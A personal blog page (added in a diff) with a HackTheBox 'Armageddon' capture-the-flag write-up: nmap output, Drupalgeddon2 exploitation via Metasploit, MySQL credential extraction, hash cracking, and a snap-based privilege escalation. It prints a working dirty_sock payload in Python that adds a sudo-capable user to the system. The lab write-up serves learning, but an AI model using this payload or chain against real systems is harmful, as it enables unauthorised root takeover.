@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+
+
+<html lang="en-us" data-theme="">
+<head>
+    
+        
+<meta charset="utf-8">
+<meta name="HandheldFriendly" content="True">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer-when-downgrade">
+
+<title>HTB - Armageddon - ybenel</title>
+
+<meta name="description" content="Armageddon Easy Box By bertolis, that consists of basic identification of old unpatched web framework that is vulnerable to a remote code execution exploit, and little enumeration and database dump with password cracking and the wrong use of sudo permissions (terms).">
+
+
+
+
+
+<link rel="icon" type="image/x-icon" href="https://ybenel.cf/favicon.ico">
+<link rel="apple-touch-icon-precomposed" href="https://ybenel.cf/favicon.png">
+
+
+<style>
+  body {
+    visibility: hidden;
+    opacity: 0;
+  }
+</style>
+
+<noscript>
+  <style>
+    body {
+      visibility: visible;
+      opacity: 1;
+    }
+  </style>
+</noscript>
+
+
+
+    
+
+
+
+
+
+    
+    
+        
+    
+    
+
+    
+        <link rel="stylesheet" href="https://ybenel.cf/css/style.min.498349ff6e7919343de1acfbcd45cfd0c7f847781d60c671960a5c0adec35e48.css" integrity="sha256-SYNJ/255GTQ94az7zUXP0Mf4R3gdYMZxlgpcCt7DXkg=">
+    
+
+
+
+
+
+    
+
+    
+
+
+
+
+
+    
+    
+        
+    
+    
+
+    
+        <script src="https://ybenel.cf/js/script.min.74bf1a3fcf1af396efa4acf3e660e876b61a2153ab9cbe1893ac24ea6d4f94ee.js" type="text/javascript" charset="utf-8" integrity="sha256-dL8aP88a85bvpKzz5mDodrYaIVOrnL4Yk6wk6m1PlO4="></script>
+    
+
+
+
+
+
+
+
+<meta property="og:title" content="HTB - Armageddon" />
+<meta property="og:description" content="Armageddon Easy Box By bertolis, that consists of basic identification of old unpatched web framework that is vulnerable to a remote code execution exploit, and little enumeration and database dump with password cracking and the wrong use of sudo permissions (terms)." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ybenel.cf/post/htb-armageddon/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2021-03-27T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-03-27T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB - Armageddon"/>
+<meta name="twitter:description" content="Armageddon Easy Box By bertolis, that consists of basic identification of old unpatched web framework that is vulnerable to a remote code execution exploit, and little enumeration and database dump with password cracking and the wrong use of sudo permissions (terms)."/>
+
+
+
+
+
+
+
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-12S7XTXXWH"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-12S7XTXXWH', { 'anonymize_ip': false });
+}
+</script>
+
+
+
+
+
+
+
+    
+</head>
+<body>
+    <a class="skip-main" href="#main">Skip to main content</a>
+    <div class="container">
+        <header class="common-header"> 
+            
+                <div class="header-top">
+    <h1 class="site-title">
+    <a href="/">ybenel</a>
+</h1>
+    <ul class="social-icons">
+
+
+    
+        <li>
+            <a href="https://github.com/m1ndo" title="Github" rel="me">
+            <span class="inline-svg" >
+
+
+
+
+    
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+</span>
+
+            </a>
+        </li>
+    
+
+    
+        <li>
+            <a href="https://twitter.com/_ybenel" title="Twitter" rel="me">
+            <span class="inline-svg" >
+
+
+
+
+    
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+
+</span>
+
+            </a>
+        </li>
+    
+
+
+
+    <li>
+            <a href="https://ybenel.cf/index.xml" title="RSS" rel="me">
+            <span class="inline-svg" >
+
+
+
+
+    
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M128.081 415.959c0 35.369-28.672 64.041-64.041 64.041S0 451.328 0 415.959s28.672-64.041 64.041-64.041 64.04 28.673 64.04 64.041zm175.66 47.25c-8.354-154.6-132.185-278.587-286.95-286.95C7.656 175.765 0 183.105 0 192.253v48.069c0 8.415 6.49 15.472 14.887 16.018 111.832 7.284 201.473 96.702 208.772 208.772.547 8.397 7.604 14.887 16.018 14.887h48.069c9.149.001 16.489-7.655 15.995-16.79zm144.249.288C439.596 229.677 251.465 40.445 16.503 32.01 7.473 31.686 0 38.981 0 48.016v48.068c0 8.625 6.835 15.645 15.453 15.999 191.179 7.839 344.627 161.316 352.465 352.465.353 8.618 7.373 15.453 15.999 15.453h48.068c9.034-.001 16.329-7.474 16.005-16.504z"/></svg>
+
+</span>
+
+            </a>
+        </li>
+    
+
+</ul>
+</div>
+
+    <nav>
+        
+        
+        <a class="" href="https://ybenel.cf/about/" title="">About</a>
+        
+        <a class="" href="https://ybenel.cf/categories/" title="">categories</a>
+        
+        <a class="" href="https://ybenel.cf/tags/" title="">Tags</a>
+        
+        <a class="" href="https://ybenel.cf/posts/" title="">Archive</a>
+        
+    </nav>
+
+
+
+
+
+
+            
+        </header>
+        <main id="main" tabindex="-1"> 
+            
+    
+
+    <article class="post h-entry">
+        <div class="post-header">
+            <header>
+                <h1 class="p-name post-title">HTB - Armageddon</h1>
+
+                
+            </header>
+        </div>
+        <div class="content e-content">
+            <p>Armageddon Easy Box By bertolis, that consists of basic identification of old unpatched web framework that is vulnerable to a remote code execution exploit, and little enumeration and database dump with password cracking and the wrong use of sudo permissions (terms).</p>
+<h2 id="enumeration" >Enumeration
+<span>
+    <a href="#enumeration">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><ul>
+<li>We start of with an intense full port scan with nmap.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.91 scan initiated Sat Mar 27 16:47:39 2021 as: nmap -p- --min-rate 10000 -v -oN full_port.nmap 10.129.100.170</span>
+</span></span><span style="display:flex;"><span>Increasing send delay <span style="color:#66d9ef">for</span> 10.129.100.170 from <span style="color:#ae81ff">0</span> to <span style="color:#ae81ff">5</span> due to <span style="color:#ae81ff">55</span> out of <span style="color:#ae81ff">183</span> dropped probes since last increase.
+</span></span><span style="display:flex;"><span>Warning: 10.129.100.170 giving up on port because retransmission cap hit <span style="color:#f92672">(</span>10<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Increasing send delay <span style="color:#66d9ef">for</span> 10.129.100.170 from <span style="color:#ae81ff">640</span> to <span style="color:#ae81ff">1000</span> due to <span style="color:#ae81ff">110</span> out of <span style="color:#ae81ff">366</span> dropped probes since last increase.
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> armageddon.htb <span style="color:#f92672">(</span>10.129.100.170<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.098s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">40576</span> closed ports, <span style="color:#ae81ff">24958</span> filtered ports
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span></code></pre></div><ul>
+<li>Then we run another nmap scan to identify what version/service ports are running on.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.91 scan initiated Sat Mar 27 16:48:56 2021 as: nmap -sC -sV -p80 -oN scan.nmap 10.129.100.170</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> armageddon.htb <span style="color:#f92672">(</span>10.129.100.170<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.070s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.6 <span style="color:#f92672">((</span>CentOS<span style="color:#f92672">)</span> PHP/5.4.16<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-generator: Drupal <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>http://drupal.org<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">36</span> disallowed entries <span style="color:#f92672">(</span><span style="color:#ae81ff">15</span> shown<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| /includes/ /misc/ /modules/ /profiles/ /scripts/
+</span></span><span style="display:flex;"><span>| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
+</span></span><span style="display:flex;"><span>| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
+</span></span><span style="display:flex;"><span>|_/LICENSE.txt /MAINTAINERS.txt
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.6 <span style="color:#f92672">(</span>CentOS<span style="color:#f92672">)</span> PHP/5.4.16
+</span></span><span style="display:flex;"><span>|_http-title: Welcome to  Armageddon |  Armageddon
+</span></span></code></pre></div><ul>
+<li>Nmap Identifies Port 80 To be running drupal 7 which is an old version and possibly surfring from many RCE&rsquo;s Exploits .</li>
+</ul>
+<p><img src="/imgs/arma/exploits.png" alt="searchsploit_exploits"></p>
+<h3 id="foothold" >Foothold
+<span>
+    <a href="#foothold">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Checking Exploits that <strong>searchploit</strong> showed and from the name of the box it looks like the drupal installation is highly vulnerable to Drupalgeddon2/3 , further tho running <strong>Metasploit</strong> to launch the exploit.</li>
+</ul>
+<p><img src="/imgs/arma/metasploit1.png" alt="metasploit1"></p>
+<ul>
+<li>After Few Moments.</li>
+</ul>
+<p><img src="/imgs/arma/msf_worked.png" alt="msf_worked1"></p>
+<h4 id="user-enumeration" >User Enumeration
+<span>
+    <a href="#user-enumeration">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h4><ul>
+<li>After Getting A foothold on the machine i tried spawning another shell to get a full tty shell ,however the following error is giving .</li>
+</ul>
+<p><img src="/imgs/arma/no_tty.png" alt="no_revshell"></p>
+<ul>
+<li>This concludes that the there&rsquo;s some sort of firewall blocking it or there&rsquo;s restrictions that don&rsquo;t allow such outcoming connections like sandboxed programs in this case apache?.</li>
+<li>However there&rsquo;s an allowed connection at port 4444</li>
+</ul>
+<p><img src="/imgs/arma/rev_shell.png" alt="rev_shell"></p>
+<ul>
+<li>Yet trying to spawn a tty results into another issue which confirms this a sandboxed environment .</li>
+</ul>
+<p><img src="/imgs/arma/sandboxed.png" alt="sandboxed_box"></p>
+<ul>
+<li>Let&rsquo;s get <strong>linpeas</strong> and run it, PS: Since this is a restricted environment we cannot make files executable or get them with any port unless 80.</li>
+</ul>
+<p><img src="/imgs/arma/linpeas.png" alt="linpeas_start"></p>
+<ul>
+<li>Linpeas did find drupal Mysql password</li>
+</ul>
+<p><img src="/imgs/arma/linpeas2.png" alt="finding_mysql_creds"></p>
+<ul>
+<li>Let&rsquo;s check the full file [/var/www/html/sites/default/settings.php] for mysql username And Password.</li>
+</ul>
+<p><img src="/imgs/arma/creds_mysql.png" alt="creds_mysql"></p>
+<ul>
+<li>Sweet , now let&rsquo;s connect to mysql and dump what juicy stuff it holds .</li>
+<li>Reminder, I had issues connecting to mysql directly with mysql client however i did a betterway to get the content of mysql database through mysqldump.</li>
+</ul>
+<p><img src="/imgs/arma/mysql_dump.png" alt="mysql_dump"></p>
+<ul>
+<li>now i can just download it and cat it or import it to my own mysql server.</li>
+</ul>
+<p><img src="/imgs/arma/dump_view.png" alt="dump_view"></p>
+<ul>
+<li>we can see that&rsquo;s there&rsquo;s the user <strong>brucetherealadmin</strong> which is a local user , let&rsquo;s crack its hash and try to ssh with it.</li>
+</ul>
+<p><img src="/imgs/arma/crack_hash.png" alt="brute_pass_crack"></p>
+<ul>
+<li>Great it&rsquo;s cracked , Now let&rsquo;s try to ssh into <strong>Bruce</strong> and read the <strong>user.txt</strong></li>
+</ul>
+<p><img src="/imgs/arma/get_user.png" alt="get_user"></p>
+<h2 id="privilege-escalation" >Privilege Escalation
+<span>
+    <a href="#privilege-escalation">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><h3 id="initial-recon" >Initial Recon
+<span>
+    <a href="#initial-recon">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>After we got into user <strong>bruce</strong> let&rsquo;s see if he has any sudo permissions,terms whatever .</li>
+</ul>
+<p><img src="/imgs/arma/sudo_int.png" alt="sudo_terms"></p>
+<ul>
+<li>
+<p>Looks like he (<strong>bruce</strong>) can install snap packages , This is really interesting .</p>
+</li>
+<li>
+<p>Let&rsquo;s create a crafted snap package and install it simply it will be just a setuid binary packaged in snap that will get us root , otherway is by overwritten the content of /etc/passwd by adding a root user to it that will can ssh to &hellip;. , there&rsquo;s alot of way tho.</p>
+</li>
+<li>
+<p>There&rsquo;s few exploits that were made for snapd that allowed installation of malicious crafted snaps , however we don&rsquo;t need to run those exploits because this version of snap is patched and we have root privileges to install any snap package.</p>
+</li>
+<li>
+<p>So In Order To Create a snap package i had to install an ubuntu vm cuz i&rsquo;m running arch based os, so i cheated a bit and i didn&rsquo;t want to run a vm so i used a prepacked snaps from those exploits <a href="https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py">link</a></p>
+</li>
+<li>
+<p>i decoded the base64 and wrote it to a file using python</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&#39;&#39;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4256</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;==&#39;</span>)
+</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(payload)
+</span></span><span style="display:flex;"><span>open(<span style="color:#e6db74">&#34;crafted.snap&#34;</span>,<span style="color:#e6db74">&#39;wb&#39;</span>)<span style="color:#f92672">.</span>write(d)
+</span></span></code></pre></div><ul>
+<li>Then downloaded the file and installed it .</li>
+</ul>
+<p><img src="/imgs/arma/inst_run.png" alt="inst_run"></p>
+<ul>
+<li>Now let&rsquo;s su to the dirty_sock user we added to /etc/passwd and read the root flag.</li>
+</ul>
+<p><img src="/imgs/arma/read_root.png" alt="read_root"></p>
+<p>And That&rsquo;s it , that&rsquo;s <strong>Armageddon</strong> hope you enjoyed the writeup take care and i&rsquo;ll see you all other time.</p>
+        </div>
+        
+
+    
+
+
+
+<div class="post-info">
+    
+        <div class="post-date dt-published">
+            <a class="u-url" href="/post/htb-armageddon/"><time datetime="2021-03-27">Sat Mar 27 2021</time></a>
+            
+        </div>
+    
+
+    <a class="post-hidden-url u-url" href="https://ybenel.cf/post/htb-armageddon/">https://ybenel.cf/post/htb-armageddon/</a>
+    <a href="https://ybenel.cf" class="p-name p-author post-hidden-author h-card" rel="me">ybenel</a>
+
+
+    <div class="post-taxonomies">
+        
+            <ul class="post-categories">
+                
+                    
+                    <li><a href="https://ybenel.cf/categories/htb/">HTB</a></li>
+                
+            </ul>
+        
+        
+            <ul class="post-tags">
+                
+                    
+                    <li><a href="https://ybenel.cf/tags/easy/">#Easy</a></li>
+                
+                    
+                    <li><a href="https://ybenel.cf/tags/drupalgeddon2/">#Drupalgeddon2</a></li>
+                
+                    
+                    <li><a href="https://ybenel.cf/tags/drupal/">#Drupal</a></li>
+                
+                    
+                    <li><a href="https://ybenel.cf/tags/hashcat/">#Hashcat</a></li>
+                
+                    
+                    <li><a href="https://ybenel.cf/tags/snap/">#Snap</a></li>
+                
+                    
+                    <li><a href="https://ybenel.cf/tags/snap-install/">#Snap Install</a></li>
+                
+            </ul>
+        
+        
+    </div>
+</div>
+
+    </article>
+
+    
+        
+        
+            <h3 class="read-next-title">Read next</h3>
+            <ul class="read-next-posts">
+                
+                <li><a href="/post/htb-delivery/">HTB - Delivery</a></li>
+                
+            </ul>
+        
+    
+
+    
+        
+    <div class="pagination post-pagination">
+        <div class="left pagination-item ">
+            
+                <a href="/post/emacs-mail-setup/">How To Setup Mail In Emacs</a>
+            
+        </div>
+        <div class="right pagination-item ">
+            
+                <a href="/post/htb-delivery/">HTB - Delivery</a>
+            
+        </div>
+    </div>
+
+
+
+
+    
+
+    
+        
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "ybenel" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+
+
+
+
+
+
+
+    
+
+        </main>
+        
+            <footer class="common-footer">
+    
+    
+
+    <div class="common-footer-bottom">
+        
+        <div class="copyright">
+            <p>© ybenel (M1ndo), 2023<br>
+            Powered by <a target="_blank" rel="noopener noreferrer" href="https://gohugo.io/">Hugo</a>, theme <a target="_blank" rel="noopener noreferrer" href="https://github.com/mitrichius/hugo-theme-anubis">Anubis</a>.<br>
+            
+            </p>  
+        </div> 
+
+        
+
+    
+
+
+
+    <button class="theme-switcher">
+        Dark theme
+    </button>
+
+
+<script>
+const STORAGE_KEY = 'user-color-scheme'
+const defaultTheme = "dark"
+
+let currentTheme
+let switchButton
+let autoDefinedScheme = window.matchMedia('(prefers-color-scheme: dark)')
+
+const autoChangeScheme = e => {
+    currentTheme = e.matches ? 'dark' : 'light'
+    document.documentElement.setAttribute('data-theme', currentTheme)
+    changeButtonText()
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+    switchButton = document.querySelector('.theme-switcher')
+    currentTheme = detectCurrentScheme()
+    if (currentTheme == 'dark') {
+        document.documentElement.setAttribute('data-theme', 'dark')
+    }
+    if (currentTheme == 'auto') {
+        autoChangeScheme(autoDefinedScheme);
+        autoDefinedScheme.addListener(autoChangeScheme);
+    }
+
+    if (switchButton) {
+        changeButtonText()
+        switchButton.addEventListener('click', switchTheme, false)
+    }
+  
+    showContent()
+})
+
+function detectCurrentScheme() {
+    if (localStorage !== null && localStorage.getItem(STORAGE_KEY)) {
+        return localStorage.getItem(STORAGE_KEY)
+    } 
+    if (defaultTheme) {
+        return defaultTheme
+    } 
+    if (!window.matchMedia) {
+        return 'light'
+    } 
+    if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        return 'dark'
+    }
+    return 'light'
+}
+
+function changeButtonText()
+{   
+    if (switchButton) {
+        switchButton.textContent = currentTheme == 'dark' ?  "Light theme" : "Dark theme"
+    }
+}
+
+function switchTheme(e) {
+    if (currentTheme == 'dark') {
+        if (localStorage !== null)
+            localStorage.setItem(STORAGE_KEY, 'light')
+        document.documentElement.setAttribute('data-theme', 'light')
+        currentTheme = 'light'
+    } else {
+        if (localStorage !== null)
+            localStorage.setItem(STORAGE_KEY, 'dark')
+        document.documentElement.setAttribute('data-theme', 'dark')
+        currentTheme = 'dark'
+    }
+    changeButtonText()
+}
+
+function showContent() {
+    document.body.style.visibility = 'visible';
+    document.body.style.opacity = 1;
+}
+</script>   
+    </div>
+
+    <p class="h-card vcard">
+
+    <a href=https://ybenel.cf class="p-name u-url url fn" rel="me">ybenel (M1ndo)</a> 
+
+    
+
+     
+        <img class="u-photo" src="/imgs/mcd.png" />
+    
+</p> 
+</footer>
+
+        
+    </div>
+</body>
+</html>
